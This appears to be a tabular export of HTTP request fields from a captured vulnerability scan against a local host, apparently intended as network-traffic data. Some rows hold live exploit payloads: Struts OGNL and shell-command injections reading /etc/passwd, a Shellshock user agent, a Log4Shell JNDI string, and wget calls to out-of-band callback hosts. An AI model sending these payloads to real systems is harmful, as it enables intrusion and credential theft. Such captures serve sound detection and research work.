http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
*/*	gzip	en															close		596	596	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/login.action		POST				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/login.action
	gzip																close		5909	5909	text/xml						192.168.1.104															1	http://192.168.1.104/web/sitecore/shell/ClientBin/Reporting/Report.ashx		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36				/web/sitecore/shell/ClientBin/Reporting/Report.ashx
	gzip																close		325	325	text/xml						192.168.1.104															1	http://192.168.1.104/web/cgi-bin/mt/mt-xmlrpc.cgi		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/cgi-bin/mt/mt-xmlrpc.cgi
	gzip																close		82	82	application/octet-stream						192.168.1.104															1	http://192.168.1.104/web/invoker/EJBInvokerServlet/		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36				/web/invoker/EJBInvokerServlet/
	gzip																close				application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/include/nuclei.txt		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36				/web/include/nuclei.txt
	gzip																close		158	158	application/x-www-form-urlencoded; charset=UTF-8						192.168.1.104															1	http://192.168.1.104/web/wp-admin/admin-ajax.php?action=action_name		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36				/web/wp-admin/admin-ajax.php?action=action_name
	gzip																close		30	30	text/html						192.168.1.104															1	http://192.168.1.104/web/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36				/web/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
	gzip																close		38	38	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/webmail/basic/		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36				/web/webmail/basic/
	gzip																close		30	30	text/html						192.168.1.104															1	http://192.168.1.104/web/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36				/web/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
	gzip																close		30	30	text/html						192.168.1.104															1	http://192.168.1.104/web/laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36				/web/laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
*/*	gzip																close										192.168.1.104															1	http://192.168.1.104/web/api/experimental/dags/example_trigger_target_dag/paused/false		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36				/web/api/experimental/dags/example_trigger_target_dag/paused/false
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/25SnEkT2P49VWtBjX7t0PRxInp7.php		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36				/web/25SnEkT2P49VWtBjX7t0PRxInp7.php
	gzip																close		30	30	text/html						192.168.1.104															1	http://192.168.1.104/web/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
*/*	gzip																close		41	41	application/json						192.168.1.104															1	http://192.168.1.104/web/api/experimental/dags/example_trigger_target_dag/dag_runs		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36				/web/api/experimental/dags/example_trigger_target_dag/dag_runs
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=cat%20/etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36				/web/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=cat%20/etc/passwd
	gzip																close		30	30	text/html						192.168.1.104															1	http://192.168.1.104/web/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/admin/elfinder/elfinder-cke.html		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web/admin/elfinder/elfinder-cke.html
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/websso/SAML2/SSO/vsphere.local?SAMLRequest=		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36		${jndi:${lower:d}n${lower:s}://${env:hostName}.c8ach799m8v918fkv9igcekcteeyyyyy4.oast.me}		/web/websso/SAML2/SSO/vsphere.local?SAMLRequest=
*/*	gzip	en															close		256	256	application/soap;  charset="utf-8"						192.168.1.104															1	http://192.168.1.104/web/_async/AsyncResponseService		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36				/web/_async/AsyncResponseService
	gzip																close		265	265							192.168.1.104															1	http://192.168.1.104/web/v1/agent/service/register		PUT				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/v1/agent/service/register
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/%04%D7%7F%BF%18%D8%7F%BF%18%D8%7F%BF%08%B7%06%08;%7Bwget,http://c8ach799m8v918fkv9igcekcteayyyybk.oast.me%7D;%04%D7%7F%BF%18%D8%7F%BF%18%D8%7F%BF%08%B7%06%08;%7Bwget,http://c8ach799m8v918fkv9igcekcteayyyybc.oast.me%7D;?AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36				/web/%04%D7%7F%BF%18%D8%7F%BF%18%D8%7F%BF%08%B7%06%08;%7Bwget,http://c8ach799m8v918fkv9igcekcteayyyybk.oast.me%7D;%04%D7%7F%BF%18%D8%7F%BF%18%D8%7F%BF%08%B7%06%08;%7Bwget,http://c8ach799m8v918fkv9igcekcteayyyybc.oast.me%7D;?AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
	gzip																close		140	140	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/ajax/render/widget_tabbedcontainer_tab_panel		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/ajax/render/widget_tabbedcontainer_tab_panel
*/*	gzip	en															close		106	106	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/cgi-bin/file_transfer.cgi		POST				HTTP/1.1																			Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36				/web/cgi-bin/file_transfer.cgi
	gzip																close		277	277	application/json						192.168.1.104															1	http://192.168.1.104/web/v2/query		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36				/web/v2/query
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/assets/backend/elfinder/elfinder-cke.html		GET				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/assets/backend/elfinder/elfinder-cke.html
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/premise/front/getPingData?url=http://0.0.0.0:9600/sm/api/v1/firewall/zone/services?zone=;/usr/bin/id;		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36				/web/premise/front/getPingData?url=http://0.0.0.0:9600/sm/api/v1/firewall/zone/services?zone=;/usr/bin/id;
*/*	gzip	en															close		575	575	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/poc.jsp/		PUT				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F				/web/poc.jsp/
*/*	gzip	en															close		56	56	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/index.php		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/index.php
*/*	gzip	en															close		58	58							192.168.1.104															1	http://192.168.1.104/web/search.php?searchtype=5		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/search.php?searchtype=5
	gzip																close		1130	1130	multipart/form-data; boundary=43992a07d9a30213782780204a9f032b						192.168.1.104															1	http://192.168.1.104/web/./RestAPI/LogonCustomization		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36				/web/./RestAPI/LogonCustomization
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/s=set&_method=__construct&method=*&filter[]=system		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36				/web/s=set&_method=__construct&method=*&filter[]=system
*/*	gzip	en															close		56	56	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/lcms/index.php		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36				/web/lcms/index.php
*/*	gzip	en															close		2528	2528	application/xml						192.168.1.104															1	http://192.168.1.104/web/orders/3		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36				/web/orders/3
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/oauth/authorize?response_type=${13337*73331}&client_id=acme&scope=openid&redirect_uri=http://test		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36				/web/oauth/authorize?response_type=${13337*73331}&client_id=acme&scope=openid&redirect_uri=http://test
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/reports/rwservlet/showenv		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36				/web/reports/rwservlet/showenv
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/esp/cms_changeDeviceContext.esp?device=aaaaa:a%27";user|s."1337";		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36			PHPSESSID=25SnElQMF0dQm3Kkn3fgNL24Mk0;	/web/esp/cms_changeDeviceContext.esp?device=aaaaa:a%27";user|s."1337";
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[33:system(%27wget%20http://example.com%27)]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[33:system(%27wget%20http://example.com%27)]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json
	gzip																close		106	106	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/./RestAPI/Connection		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/./RestAPI/Connection
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/lui/		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36				/web/lui/
*/*	gzip	en															close		21	21							192.168.1.104															1	http://192.168.1.104/web/debug.php		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/debug.php
application/json	gzip																close		631	631	multipart/form-data; boundary=---------------------------99533888113153068481322586663						192.168.1.104														192.168.1.104/user/register	1	http://192.168.1.104/web/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax
*/*	gzip	en															close		92	92	image/jp2						192.168.1.104															1	http://192.168.1.104/web/meta		PUT				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36				/web/meta
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36				/web?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
	gzip																close		92	92	application/x-www-form-urlencoded						192.168.1.104														http://192.168.1.104	1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/api/ping?count=5&host=;cat%20/etc/passwd;&port=80&source=1.1.1.1&type=icmp		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36				/web/api/ping?count=5&host=;cat%20/etc/passwd;&port=80&source=1.1.1.1&type=icmp
	gzip																close		169	169	application/x-www-form-urlencoded						192.168.1.104														http://192.168.1.104/mifs/user/login.jsp	1	http://192.168.1.104/web/mifs/j_spring_security_check		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/mifs/j_spring_security_check
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/chkisg.htm%3FSip%3D1.1.1.1%20%7C%20cat%20%2Fetc%2Fpasswd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/chkisg.htm%3FSip%3D1.1.1.1%20%7C%20cat%20%2Fetc%2Fpasswd
	gzip																close		1689	1689	application/soap+xml;charset=UTF-8						192.168.1.104															1	http://192.168.1.104/web/wsman		POST				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F				/web/wsman
	gzip																close		288	288	multipart/form-data; boundary=---------------------------154934846911423734231554128137						192.168.1.104															1	http://192.168.1.104/web/clients/editclient.php?id=25SnEhNV0Evo0QU7TqpJMOkhDlo&action=update		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36				/web/clients/editclient.php?id=25SnEhNV0Evo0QU7TqpJMOkhDlo&action=update
	gzip																close		286	286	application/json						192.168.1.104															1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/logos_clients/1.php		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36				/web/logos_clients/1.php
	gzip																close		152	152	application/json						192.168.1.104															1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36				/web/
*/*	gzip	en															close		71	71	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/search/		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web/search/
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/cgi-bin/status		GET				HTTP/1.1																			() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd;'				/web/cgi-bin/status
	gzip																close		47	47	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/confluence/pages/createpage-entervariables.action?SpaceKey=x		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36				/web/confluence/pages/createpage-entervariables.action?SpaceKey=x
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/contact-form-7/readme.txt		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/wp-content/plugins/contact-form-7/readme.txt
	gzip																close		8	8	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/lucee/admin/imgProcess.cfm?file=/whatever		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36				/web/lucee/admin/imgProcess.cfm?file=/whatever
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/script/		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36				/web/script/
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web?IO.popen(%27cat%20%2Fetc%2Fpasswd%27).read%0A%23		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web?IO.popen(%27cat%20%2Fetc%2Fpasswd%27).read%0A%23
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/cgi-bin/login?LD_DEBUG=files		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/cgi-bin/login?LD_DEBUG=files
application/json	gzip																close		278	278	application/json						192.168.1.104															1	http://192.168.1.104/web/_ignition/execute-solution		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36				/web/_ignition/execute-solution
	gzip																close		325	325	text/xml						192.168.1.104															1	http://192.168.1.104/web/cgi-bin/mt/mt-xmlrpc.cgi		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/cgi-bin/mt/mt-xmlrpc.cgi
*/*	gzip	en															close		596	596	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/login.action		POST				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/login.action
application/json	gzip																close		183	183	application/json						192.168.1.104															1	http://192.168.1.104/web/_ignition/execute-solution		POST				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F				/web/_ignition/execute-solution
	gzip																close		82	82	application/octet-stream						192.168.1.104															1	http://192.168.1.104/web/invoker/EJBInvokerServlet/		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36				/web/invoker/EJBInvokerServlet/
